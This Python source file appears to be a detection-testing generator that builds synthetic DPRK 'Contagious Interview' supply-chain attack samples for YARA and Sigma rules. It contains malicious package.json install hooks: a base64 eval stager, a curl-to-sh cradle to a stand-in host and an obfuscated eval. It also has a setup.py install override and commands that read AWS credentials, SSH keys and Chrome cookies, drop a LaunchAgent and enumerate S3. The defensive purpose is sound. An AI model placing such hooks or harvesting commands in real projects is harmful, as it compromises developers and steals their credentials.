"""Craftsman Agent: Developer Supply Chain & Workstation Credential Access (DPRK Contagious Interview).

Generates synthetic permutations along:
1. Package manager lifecycle script hooks (package.json preinstall/postinstall/prepare, setup.py cmdclass).
2. Inline decoders, string concatenation, and dynamic eval cradles.
3. macOS/Linux developer workstation credential harvesting (~/.aws/credentials, ~/.ssh/id_rsa, Chrome Cookies).
4. Cloud identity reconnaissance (AWS STS get-caller-identity, S3 checkpoint enumeration).
"""

from __future__ import annotations

import base64
import json
import uuid
from typing import List, Optional

from ..models import Variant
from .base import BaseCraftsman


class SupplyChainCraftsman(BaseCraftsman):
    """Specialized craftsman modeling DPRK Famous Chollima / Contagious Interview tradecraft."""

    def generate_variants(self, cycle: int, feedback: Optional[List[str]] = None) -> List[Variant]:
        variants: List[Variant] = []

        if cycle == 1:
            # Cycle 1: Package lifecycle hooks and encoded stagers
            b64_payload = base64.b64encode(b"const https = require('https'); https.get('https://careers-eval.stage.invalid/pkg/init.js');").decode("ascii")
            pkg_base64_json = {
                "name": "ai-benchmark-evaluator",
                "version": "1.0.4",
                "description": "State-of-the-art LLM evaluation harness and benchmark metrics",
                "main": "index.js",
                "scripts": {
                    "test": "node test.js",
                    "postinstall": f"node -e \"eval(Buffer.from('{b64_payload}','base64').toString())\""
                },
                "dependencies": {
                    "chalk": "^4.1.2"
                }
            }
            variants.append(
                Variant(
                    id=f"supply-{uuid.uuid4().hex[:8]}",
                    target_type="yara",
                    axis="lifecycle_hook",
                    mutation_name="pkg_postinstall_base64_eval",
                    description="package.json postinstall hook decoding base64 payload into eval",
                    payload=json.dumps(pkg_base64_json, indent=2),
                    cycle=cycle,
                )
            )

            pkg_curl_json = {
                "name": "torch-distributed-optimizer",
                "version": "0.3.1",
                "scripts": {
                    "preinstall": "curl -s https://recruitment-review.stage.invalid/check.sh | sh"
                }
            }
            variants.append(
                Variant(
                    id=f"supply-{uuid.uuid4().hex[:8]}",
                    target_type="yara",
                    axis="network_fetch",
                    mutation_name="pkg_preinstall_curl_cradle",
                    description="package.json preinstall hook downloading shell payload via curl",
                    payload=json.dumps(pkg_curl_json, indent=2),
                    cycle=cycle,
                )
            )

            setup_py_content = (
                "from setuptools import setup\n"
                "from setuptools.command.install import install\n"
                "import urllib.request\n\n"
                "class CustomInstall(install):\n"
                "    def run(self):\n"
                "        urllib.request.urlopen('https://benchmark-stage.invalid/agent/setup')\n"
                "        install.run(self)\n\n"
                "setup(\n"
                "    name='hf-token-accelerator',\n"
                "    version='0.1.0',\n"
                "    cmdclass={'install': CustomInstall},\n"
                ")\n"
            )
            variants.append(
                Variant(
                    id=f"supply-{uuid.uuid4().hex[:8]}",
                    target_type="yara",
                    axis="setup_py_hook",
                    mutation_name="setup_py_cmdclass_override",
                    description="setup.py overriding setuptools install cmdclass with network fetch",
                    payload=setup_py_content,
                    cycle=cycle,
                )
            )

        elif cycle == 2:
            # Cycle 2: Workstation Credential Harvesting & Process Spawning
            variants.append(
                Variant(
                    id=f"supply-{uuid.uuid4().hex[:8]}",
                    target_type="sigma",
                    axis="credential_access",
                    mutation_name="proc_macos_node_scrape_aws_creds",
                    description="Node.js runtime spawning shell child process reading ~/.aws/credentials",
                    payload={
                        "EventID": 1,
                        "ParentImage": "/usr/local/bin/node",
                        "Image": "/bin/sh",
                        "CommandLine": 'sh -c "cat ~/.aws/credentials || cat ~/.aws/config"',
                        "User": "researcher",
                    },
                    cycle=cycle,
                )
            )

            variants.append(
                Variant(
                    id=f"supply-{uuid.uuid4().hex[:8]}",
                    target_type="sigma",
                    axis="credential_access",
                    mutation_name="proc_macos_python_read_ssh_keys",
                    description="Python runtime reading developer SSH keys and configs",
                    payload={
                        "EventID": 1,
                        "ParentImage": "/usr/bin/python3",
                        "Image": "/bin/bash",
                        "CommandLine": 'bash -c "tar -czf /tmp/ssh_keys.tgz ~/.ssh/id_rsa ~/.ssh/known_hosts"',
                        "User": "researcher",
                    },
                    cycle=cycle,
                )
            )

            variants.append(
                Variant(
                    id=f"supply-{uuid.uuid4().hex[:8]}",
                    target_type="sigma",
                    axis="credential_access",
                    mutation_name="proc_macos_browser_cookies_sqlite",
                    description="Python process querying Chrome Cookies database for session tokens",
                    payload={
                        "EventID": 1,
                        "ParentImage": "/usr/bin/python3",
                        "Image": "/usr/bin/sqlite3",
                        "CommandLine": 'sqlite3 "~/Library/Application Support/Google/Chrome/Default/Cookies" "SELECT host_key, name, encrypted_value FROM cookies"',
                        "User": "researcher",
                    },
                    cycle=cycle,
                )
            )

            variants.append(
                Variant(
                    id=f"supply-{uuid.uuid4().hex[:8]}",
                    target_type="sigma",
                    axis="persistence",
                    mutation_name="proc_macos_launchagent_persistence",
                    description="Dropping macOS LaunchAgent for user-level persistence",
                    payload={
                        "EventID": 1,
                        "ParentImage": "/usr/local/bin/node",
                        "Image": "/bin/cp",
                        "CommandLine": "cp /tmp/com.apple.update.plist ~/Library/LaunchAgents/com.apple.update.plist",
                        "User": "researcher",
                    },
                    cycle=cycle,
                )
            )

        elif cycle == 3:
            # Cycle 3: Advanced Obfuscation & Cloud Operationalization
            pkg_unicode_json = {
                "name": "ai-distributed-runner",
                "version": "2.1.0",
                "scripts": {
                    "prepare": "node -e \"const f = global['ev' + 'al']; f(Buffer['from']('dmFyIGE9MQ==', 'base64').toString())\""
                }
            }
            variants.append(
                Variant(
                    id=f"supply-{uuid.uuid4().hex[:8]}",
                    target_type="yara",
                    axis="obfuscation",
                    mutation_name="pkg_prepare_string_concat_eval",
                    description="package.json prepare script with concatenated global eval lookups",
                    payload=json.dumps(pkg_unicode_json, indent=2),
                    cycle=cycle,
                )
            )

            variants.append(
                Variant(
                    id=f"supply-{uuid.uuid4().hex[:8]}",
                    target_type="sigma",
                    axis="cloud_recon",
                    mutation_name="proc_aws_sts_token_verification",
                    description="Stolen AWS token operationalized via aws sts get-caller-identity",
                    payload={
                        "EventID": 1,
                        "ParentImage": "/bin/bash",
                        "Image": "/usr/local/bin/aws",
                        "CommandLine": "aws sts get-caller-identity",
                        "User": "researcher",
                    },
                    cycle=cycle,
                )
            )

            variants.append(
                Variant(
                    id=f"supply-{uuid.uuid4().hex[:8]}",
                    target_type="sigma",
                    axis="cloud_recon",
                    mutation_name="proc_aws_s3_checkpoint_discovery",
                    description="Enumerating model checkpoint buckets using compromised AWS credentials",
                    payload={
                        "EventID": 1,
                        "ParentImage": "/bin/bash",
                        "Image": "/usr/local/bin/aws",
                        "CommandLine": "aws s3 ls s3://ai-training-checkpoints-prod/",
                        "User": "researcher",
                    },
                    cycle=cycle,
                )
            )

        return variants
